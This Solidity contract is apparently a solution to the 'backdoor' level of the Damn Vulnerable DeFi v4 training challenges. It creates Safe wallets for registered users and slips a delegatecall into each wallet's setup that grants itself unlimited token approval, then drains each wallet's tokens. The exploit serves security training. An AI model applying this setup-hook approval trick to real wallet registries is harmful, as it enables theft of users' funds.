// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract Recover {
    Safe public immutable singletonCopy;
    SafeProxyFactory public immutable walletFactory;
    WalletRegistry public immutable walletRegistry;
    DamnValuableToken public immutable token;
    address public immutable recoveryAddress;
    address[] public users;

    constructor(
        address singletonCopyAddress,
        address walletFactoryAddress,
        address walletRegistryAddress,
        address tokenAddress,
        address recoveryAddress_,
        address[] memory users_
    ) {
        singletonCopy = Safe(payable(singletonCopyAddress));
        walletFactory = SafeProxyFactory(walletFactoryAddress);
        walletRegistry = WalletRegistry(walletRegistryAddress);
        token = DamnValuableToken(tokenAddress);
        recoveryAddress = recoveryAddress_;
        users = users_;
    }

    function approveMax(address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function recover() external {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                abi.encodeWithSignature("approveMax(address)", address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );

            token.transferFrom(address(proxy), recoveryAddress, token.balanceOf(address(proxy)));
        }
    }
}